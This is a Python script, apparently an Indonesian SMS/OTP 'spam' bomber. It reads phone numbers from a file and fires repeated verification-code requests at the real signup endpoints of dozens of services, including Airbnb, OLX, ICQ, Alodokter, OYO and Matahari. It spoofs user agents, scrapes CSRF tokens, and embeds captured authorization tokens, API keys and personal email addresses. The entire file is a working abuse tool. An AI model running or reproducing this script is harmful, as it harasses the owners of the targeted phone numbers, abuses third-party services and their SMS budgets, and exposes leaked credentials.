import requests
import time
import json
import sys
from fake_useragent import UserAgent
from bs4 import BeautifulSoup as bs
ua = UserAgent()


def panggil():
    strfile = input("Nama File: ")
    strfile = strfile + ".txt"
    return strfile


class spam:
    def piza(nom):
        hd = {
            'user-agent': ua.random,
            'referer': 'https://www.phd.co.id/register',
            'Host': 'api-prod.diqit.io',
            'content-type': 'application/json;charset=UTF-8',
        }
        dat = {'phone': nom}
        for x in range(6):
            sia = requests.post(
                "https://api-prod.diqit.io/customer/v1/customer/register", headers=hd, json=dat)
        if 'error' in sia:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def mypoin(nom):
        url = 'https://mypoin.id/register/validate-phone-number'
        otp = 'https://mypoin.id/register/request-otp'
        r = requests.Session()
        uat = {
            "user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36"}
        uatp = {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "content-length": "102", "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://mypoin.id", "referer": "https://mypoin.id/register/validate-phone-number", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36", "x-requested-with": "XMLHttpRequest"}
        a = r.get(url, headers=uat).text
        b = bs(a, 'html.parser')
        c = b.find("input", attrs={"type": "hidden",
                   "name": "csrfmiddlewaretoken"})
        e = r.post(otp, headers=uatp, data={
                   "phone": "62"+nom, "csrfmiddlewaretoken": c["value"]}).text
        if e == '{"status": "ok"}':
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def map(nom):
        hd = {
            "Connection": "keep-alive",
            "user-agent": ua.random,
        }
        dat = {'phone': '62'+nom}
        for x in range(5):
            pil = requests.post(
                "https://cmsapi.mapclub.com/api/signup-otp", data=dat, headers=hd)
        if 'error' in pil:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def icq(nom):
        url = 'https://u.icq.net/api/v14/rapi/auth/sendCode'
        hd = {
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9,id;q=0.8,mt;q=0.7",
            "content-type": "application/json",
            "origin": "http://web.icq.com",
            "referer": "http://web.icq.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": ua.random,
        }
        dat = json.dumps({"reqId": "64708-1593781791", "params": {"phone": "62"+nom,
                         "language": "en-US", "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}})
        a = requests.post(url, headers=hd, data=dat).text
        b = json.loads(a)
        if b['status']['code'] != 20000:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def adakami(nom):
        hd = {
            "content-type": "application/json; charset=UTF-8",
            "content-length": "34",
            "accept-encoding": "gzip",
            "user-agent": "okhttp/3.8.0",
            "accept-language": "in",
            "x-ada-token": "",
            "x-ada-appid": "800006",
            "x-ada-os": "android",
            "x-ada-channel": "default",
            "x-ada-mediasource": "",
            "x-ada-agency": "adtubeagency",
            "x-ada-campaign": "AdakamiCampaign",
            "x-ada-role": "1",
            "x-ada-appversion": "1.7.0",                                                                         "x-ada-device": "",
            "x-ada-model": "SM-G935FD",
            "x-ada-os-ver": "7.1.1",                                                                             "x-ada-androidid": "a4341a2sa90a4d97",
            "x-ada-aid": "c7bbb23d-a220-4d43-9caf-153608f9bd39",
            "x-ada-afid": "1580054114839-7395423911531673296",
        }
        dat = {"ketik": 0, "nomor": "0"+nom}
        datjson = json.dumps(dat)
        r = requests.Session()
        for spem in range(5):
            a = r.post("https://api.adakami.id/adaKredit/pesan/kodeVerifikasi",
                       data=datjson, headers=hd, timeout=10).text
        if (a == '{"result":-1,"resultMessage":"Permintaan kode verifikasi sudah melebihi batas. Silakan coba lagi besok.","content":null}') or (a == '{"result":-1,"resultMessage":"Gagal abang jago","content":null}'):
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def coowry(nom):
        url = 'https://www.coowry.com/arlethdesign'
        spam = 'https://www.coowry.com/api/tokens'
        hd = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-length": "28",
            "content-type": "application/json",
            "origin": "https://www.coowry.com",
            "referer": "https://www.coowry.com/arlethdesign",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": ua.random
        }
        target = {"msisdn": "+62"+nom}
        jsn = json.dumps(target)
        r = requests.Session()
        a = r.get(url, headers={'user-agent': ua.random}).cookies
        b = r.post(spam, headers=hd, cookies={
                   '_cwpeople_keyle_key': a["_cwpeople_key"]}, data=jsn).text
        c = json.loads(b)["type"]
        if 'ok' in c:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def iuga(nom):
        pis = nom.replace("+62", "")
        r = requests.Session()
        for x in range(1):
            a = r.get('https://www.iuiga.com/register.html',
                      headers={'user-agent': ua.random}).text
            b = bs(a, 'html.parser')
            c = b.find("meta", attrs={"name": "csrf-token"})
            d = r.post('https://www.iuiga.com/login/send-register-code', headers={'user-agent': ua.random}, data={
                       "_csrf": c["content"], "phone": pis, "phone_code": "+62", "is_login": "0"}).text
            if 'success' in d:

                print('no '+nom+'~> sukses')
            else:
                print('no '+nom+'~> gagal')

    def fav(nom):
        hd = {
            "Host": "api.myfave.com",
            "Connection": "keep-alive",
            "x-user-agent": "Fave-PWA/v1.0.0",
            "User-Agent": ua.random,
            "content-type": "application/json",
            "Accept": "*/*",
            "Origin": "https://m.myfave.com",
            "Referer": "https://m.myfave.com/jakarta/auth",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        dat = {'phone': '62'+nom}
        x = requests.post("https://api.myfave.com/api/fave/v3/auth",
                          data=json.dumps(dat), headers=hd).text
        if 'error' in x:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def suplai(nom):
        hd = {
            "Host": "api.sooplai.com",                                                                           "accept": "application/json, text/plain, */*",
            "User-Agent": ua.random,
            "Content-Type": "application/json",
            "origin": "https://www.sooplai.com",
            "referer": "https://www.sooplai.com/register",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        dat = json.dumps({'phone': '62'+nom})
        for x in range(5):
            x = requests.post(
                "https://api.sooplai.com/customer/register/otp/request", data=dat, headers=hd)
        if 'error' in x:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def chataja(nom):
        data = json.dumps(
            {"user": {"app_id": "kiwari-prod", "phone_number": "62"+nom}})
        a = requests.post('https://api.chataja.co.id/api/v2/auth_nonce', data=data, headers={"Accept": "application/json, text/plain, */*", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "keep-alive", "Content-Length": "65", "Content-Type": "application/json;charset=UTF-8", "Host": "api.chataja.co.id",
                                                                                             "Origin": "https://web.chataja.co.id", "Referer": "https://web.chataja.co.id/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}).text
        b = json.loads(a)["data"]
        if b:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def depop(nom):
        hd = {'Host': 'webapi.depop.com', 'content-length': '49', 'accept': 'application/json, text/plain, */*', 'origin': 'https://signup.depop.com', 'save-data': 'on',
              'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36', 'content-type': 'application/json'}
        dat = {'phone_number': nom, 'country_code': 'ID'}
        datjs = json.dumps(dat)
        for x in range(3):
            y = requests.put(
                "https://webapi.depop.com/api/auth/v1/verify/phone", headers=hd, data=datjs)
        if 'error' in y.text:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def ruparupa(nom):
        url = 'https://wapi.ruparupa.com/auth/check-otp-auth'
        url2 = 'https://wapi.ruparupa.com/auth/generate-otp'
        hdurl = {
            'accept': 'application/json',
            'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
            'content-length': '88',
            'content-type': 'application/json',                                                                                                          'origin': 'https://m.ruparupa.com',
            'referer': 'https://m.ruparupa.com/my-account',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua.random,
            'user-platform': 'mobile',
            'x-company-name': 'odi',                                                                                                                     'x-frontend-type': 'mobile',
        }
        hdurl2 = {
            'accept': 'application/json',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7&',
            'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiODZhM2Q0ZmEtZDE3Mi00NDkwLTllOTAtN2MyM2UyZjA1MDA0IiwiaWF0IjoxNTk3NjY3MTgzLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.QBFVwucPwKlxWc43abnzEgjbNFOMHXMsXd3EaYk4tyU',
            'content-length': '103',
            'content-type': 'application/json',
            'origin': 'https://ruparupa.com',
            'referer': 'https://ruparupa.com/verification?page=otp-choices',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': ua.random,
            'user-platform': 'mobile',
            'x-company-name': 'odi',
            'x-frontend-type': 'mobile',
        }
        dataurl = {"phone": "0"+nom, "email": "ubetubed@gmail.com",
                   "action": "register", "password": ""}
        dataurljson = json.dumps(dataurl)
        dataurl2 = {"phone": "0"+nom, "action": "register",
                    "channel": "chat", "email": "", "customer_id": "0", "is_resend": 0}
        dataurl2json = json.dumps(dataurl2)
        a = requests.post(url, headers=hdurl, data=dataurljson).text
        b = requests.post(url2, headers=hdurl2, data=dataurl2json).text
        c = json.loads(b)
        if c['message'] == 'success':
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def dekoruma(nom):
        data = json.dumps({"phoneNumber": "+62"+nom, "platform": "wa"})
        r = requests.Session()
        for x in range(1):
            cal = r.post("https://auth.dekoruma.com/api/v1/register/request-otp-phone-number/?format=json",
                         headers={"content-type": "application/json", "user-agent": ua.random}, data=data).text
        if '' in cal:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def jag(nom):
        p = requests.get("https://id.jagreward.com/member/verify-mobile/"+nom)
        y = json.loads(p.text)
        if y["message"] == 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.':
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def airbnb(nom):
        head = {
            "Host": "www.airbnb.co.id",
            "content-length": "83",
            "device-memory": "2",
            "x-csrf-token": "V4$.airbnb.co.id$N_Kx2ju9iX8$gUBHaO73_UKCj4rDt2rHVNj7zvmZfOYgz38XKc9dzKw=",
            "x-csrf-without-token": "1",
            "user-agent": ua.random,
            "viewport-width": "360",
            "content-type": "application/json",
            "accept": "application/json, text/javascript, */*; q=0.01",
            "cache-control": "no-cache",
            "x-requested-with": "XMLHttpRequest",
            "origin": "https://www.airbnb.co.id",
            "referer": "https://www.airbnb.co.id/signup_login?redirect_url=/help",
        }
        dat = json.dumps(
            {"phoneNumber": "62"+nom, "workFlow": "GLOBAL_SIGNUP_LOGIN", "otpMethod": "TEXT"})
        for x in range(5):
            cal = requests.post(
                "https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=US&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id", data=dat, headers=head)
        if 'internationalPhoneNumber' in cal.text:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def kelaspintar(nom):
        r = requests.Session()
        headers = {
            'x-requested-with': 'XMLHttpRequest',
            'User-Agent': ua.random,
            'Referer': 'https://www.kelaspintar.id/',

        }
        dat = {
            "user_mobile": nom,
            "otp_type": "send_otp_reg",
            "mobile_code": "%2B62",
        }
        x = r.post('https://www.kelaspintar.id/user/otpverification',
                   data=dat, headers=headers).text
        if 'OTP send' in x:
            print('no '+nom+'~> sukses')
        else:
            print('no'+nom+'~> gagal')

    def payfazz(nom):
        hd = {'Host': 'api.payfazz.com', 'content-length': '17', 'accept': '*/*', 'origin': 'https://www.payfazz.com', 'user-agent': ua.random, 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
              'referer': 'http://www.payfazz.com/register/BEN6ZF74XL', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
        r = requests.Session()
        a = r.post('https://api.payfazz.com/v2/phoneVerifications',
                   headers=hd, data={'phone': '0'+nom})
        if 'phoneVerificationId' in a.text:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def alodokter(nom):
        r = requests.Session()
        r.headers.update(
            {'referer': 'https://www.alodokter.com/login-alodokter'})
        hy = r.get("https://www.alodokter.com/login-alodokter")
        tol = bs(hy.text, 'html.parser')
        token = tol.find('meta', {'name': 'csrf-token'})['content']
        hd = {
            'user-agent': ua.random,
            'content-type': 'application/json',
            'referer': 'https://www.alodokter.com/login-alodokter',
            'accept': 'application/json',
            'origin': 'https://www.alodokter.com',
            'x-csrf-token': token
        }
        y = r.post("https://www.alodokter.com/login-with-phone-number",
                   headers=hd, json={"user": {"phone": "0"+nom}})
        if y.json()['status'] == 'success':
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def prosehat(nom):
        head = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'origin': 'https://www.prosehat.com',
            'x-requested-with': 'XMLHttpRequest',
            'user-agent': ua.random,
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'referer': 'https://www.prosehat.com/akun',
        }
        dat = {'phone_or_email': '0'+nom, 'action': 'ajaxverificationsend'}
        ng = requests.post(
            'https://www.prosehat.com/wp-admin/admin-ajax.php', data=dat, headers=head)
        if "token" in ng.text:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def theharvest(nom):
        hd = {
            'user-agent': ua.random
        }
        dat = {
            'phone': nom
        }
        r = requests.Session()
        hyu = r.post("https://harvestcakes.com/register", headers=hd, data=dat)
        if 'function' in hyu.text:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def danacinta(nom):
        hd = {'user-agent': ua.random}
        for x in range(5):
            yu = requests.get(
                "https://api.danacita.co.id/users/send_otp/?mobile_phone=0"+nom, headers=hd)
        yu1 = json.loads(yu.text)
        if yu1["detail"] == 'Successfully sent OTP SMS':
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def redbus(nom):
        for i in range(2):
            kil = requests.get("https://m.redbus.id/api/getOtp?number=" +
                               nom+"&cc=62&whatsAppOpted=true").text
        if 'OTP' in kil:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def olx(nom):
        head = {
            "accept": "*/*",
            "x-newrelic-id": "VQMGU1ZVDxABU1lbBgMDUlI=",
            "x-panamera-fingerprint": "83b09e49653c37fb4dc38423d82d74d7#1597271158063",
            "user-agent": ua.random,
            "content-type": "application/json",
        }
        dat = json.dumps({
            "grantType": "retry",
            "method": "sms",
            "phone": "+62"+nom,
            "language": "id"
        })
        r = requests.Session()
        for x in range(5):
            eek = r.post("https://www.olx.co.id/api/auth/authenticate",
                         data=dat, headers=head).text
        if 'status' in eek:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def rupiahcepat(nom):
        hd = {
            "accept": "text/html, application/xhtml+xml, application/json, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-length": "166",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://h5.rupiahcepatweb.com",
            "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": ua.random
        }
        url = 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code'
        dit = {"mobile": "0"+nom, "noise": "1583590641573155574",
               "request_time": "158359064157312", "access_token": "11111"}
        dat = json.dumps(dit)
        r = requests.Session()
        a = r.post(url, headers=hd, data={"data": dat}).text
        b = json.loads(a)["code"]
        if b == 0:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def matahari(nom):
        r = requests.Session()
        hd = {
            'Host': 'thor.matahari.com',
            'content-length': '235',
            'modulecode': 'MR',
            'origin': 'https://www.matahari.com',
            'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJtb2R1bGVDb2RlIjoiTVIiLCJ1c2VyVHlwZSI6IjEiLCJleHAiOjE1NDM2NjA5MDYsInVzZXJOYW1lIjoiS0Zpb2ViMWhveU9FRDBERWQiLCJ1c2VySWQiOiJwcm9kdWN0aW9uNDYxOTAyNjQ0NSIsImp0aSI6IjFmMjI3NzE5LTY4OTMtNDhjYy1iNmQzLWY2OTkzMWMzMDIwYSIsImlhdCI6MTU0MzY1NzMwNn0.6XdrUX9QzD0Ld2eOJep7QnSwVjfFyjq-v7P4w0lGG9M',
            'content-type': 'application/json',
            'accept': 'application/json, text/plain, */*',
            'clientid': 'mds_mweb',
            'user-agent': ua.random,
            'sessionid': '1599562523019',
            'save-data': 'on',
            'referer': 'https://www.matahari.com/register',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        dat = {"emailAddress": "ubaydillahahyar@gmail.com", "firstName": "Bapak", "lastName": "Gile", "mobileNumber": "0"+nom,
               "mccCardNumber": "", "password": "ubetubed", "referralCode": "", "dateOfBirth": "03-01-1999", "gender": "Male", "registrationType": "N"}
        datj = json.dumps(dat)
        for x in range(5):
            yu = r.post(
                "https://thor.matahari.com/MatahariMobileAPI/register", headers=hd, data=datj)
        if 'Success' in yu.text:
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def iviru(nom):
        r = requests.Session()
        hd = {'user-agent': ua.random}
        dat = {'phone': '62'+nom}
        for x in range(2):
            hlo = r.post(
                "https://api.ivi.ru/mobileapi/user/register/phone/v6", headers=hd, data=dat)
        if 'error' in hlo.text:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def beltelecom(nom):
        r = requests.Session()
        hd = {'user-agent': ua.random}
        dat = {'phone': '62'+nom}
        ho = r.post(
            "https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru", headers=hd, data=dat)
        if ('error' in ho.text) or ('Too many' in ho.text):
            print('no '+nom+'~> sukses')
        else:
            print('no '+nom+'~> gagal')

    def mailru(nom):
        r = requests.Session()
        hd = {
            'user-agent': ua.random,
            'Content-Type': 'application/json',
        }
        dat = json.dumps({
            'phone': '62'+nom,
            'api': 2,
            'email': 'akuntesnuyul@gmail.com',
            'x-email': 'akunnuyul64@gmail.com',
        })
        yu = r.post("https://cloud.mail.ru/api/v2/notify/applink",
                    headers=hd, data=dat)
        if 'error' in yu.text:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def youla(nom):
        r = requests.Session()
        hd = {'user-agent': ua.random}
        dat = {'phone': '62'+nom}
        yu = r.post("https://youla.ru/web-api/auth/request_code",
                    headers=hd, data=dat)
        if 'error' in yu.text:
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def oyo(nom):
        r = requests.Session()
        hd = {
            "Host": "identity-gateway.oyorooms.com",
            "consumer_host": "https://www.oyorooms.com",
            "accept-language": "id",
            "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "accept": "*/*",
            "origin": "https://www.oyorooms.com",
            "referer": "https://www.oyorooms.com/login",
            "Accept-Encoding": "gzip, deflate, br",
        }
        dat = json.dumps({"phone": nom, "country_code": "+62", "country_iso_code": "ID",
                          "nod": "4", "send_otp": "true", "devise_role": "Consumer_Guest"})
        y = r.post(
            "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", headers=hd, data=dat)
        y1 = json.loads(y.text)["otp_sent"]
        if y1 == True:
            print('no '+nom+'~> sukses')
        elif y1 == False:
            print('no '+nom+'~> gagal')

    def jenius(nom):
        r = requests.Session()
        hd = {
            "accept": "*/*",
            "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
            "version": "2.36.1-7565",
            "accept-language": "id",
            "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
            "Content-Type": "application/json",
            "Host": "api.btpn.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Cookie": "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
            "User-Agent": "okhttp/3.12.1"
        }
        dat = {"query": "mutation registerPhone($phone: String!, $language: Language!) {\n  registerPhone(input: {phone: $phone, language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n", "variables": {
            "phone": nom, "language": "id"}, "operationName": "registerPhone"}
        udh = r.post("https://api.btpn.com/jenius", headers=hd, data=dat)
        print(udh.text)

    def vadershop(nom):
        r = requests.Session()
        hd = {
            'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}
        dat = json.dumps(['62'+nom, 'Vader Shop'])
        y = r.post("https://api.vader-api.com/account/sendmobilecodeasync.json",
                   headers=hd, data=dat).text
        if ('Gagal' in y) or ('hari' in y):
            print('no '+nom+'~> gagal')
        else:
            print('no '+nom+'~> sukses')

    def rupa(nom):
        uaa = {
            "Host": "wapi.ruparupa.com",
            "Connection": "keep-alive",
            "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiOGZlY2VjZmYtZTQ1Zi00MTVmLWI2M2UtMmJiMzUyZmQ2NzhkIiwiaWF0IjoxNTkzMDIyNDkyLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.fETKXQ0KyZdksWWsjkRpjiKLrJtZWmtogKyePycoF0E",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "X-Company-Name": "odi",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; IPhone Xr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
            "user-platform": "mobile",
            "X-Frontend-Type": "mobile",
            "Origin": "https://m.ruparupa.com",
            "Referer": "https://m.ruparupa.com/verification?page=otp-choices",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
        }
        datt = json.dumps({"phone": '0' + nom, "action": "register",
                           "channel": "chat", "email": "", "customer_id": "0", "is_resend": 0})
        send1 = requests.post(
            "https://wapi.ruparupa.com/auth/generate-otp", data=datt, headers=uaa)
        print(" [Rupa] Nomor ~+> " + no + (send1.json()["message"]))


file = panggil()
ojk = open(file, "r")
ojk.readline()
for no in ojk:
    nom = no.replace('\n', '')
    if len(nom) <= 10:
        no = nom.replace(nom, '00000000000')
        spam.oyo(no)
    else:
        spam.icq(nom)
        spam.adakami(nom)
        spam.iuga(nom)
        spam.fav(nom)
        spam.kelaspintar(nom)
        spam.alodokter(nom)
        spam.redbus(nom)
        spam.olx(nom)
        spam.rupa(nom)
        print(nom + " ~> Sudah selesai diproses\n\n")
ojk.close()
